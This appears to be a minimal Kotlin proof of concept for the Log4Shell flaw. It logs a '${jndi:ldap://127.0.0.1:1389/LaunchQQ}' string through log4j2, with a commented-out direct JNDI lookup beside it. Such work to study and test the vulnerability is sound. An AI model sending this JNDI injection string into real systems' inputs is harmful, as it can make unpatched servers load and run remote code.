import org.apache.logging.log4j.LogManager
import javax.naming.InitialContext

fun main() {
    // JNDI Lookup
//    val ctx = InitialContext()
//    ctx.lookup("ldap://127.0.0.1:1389/LaunchQQ")

    // log4j2
    val logger = LogManager.getLogger()
    logger.error("\${jndi:ldap://127.0.0.1:1389/LaunchQQ}")
}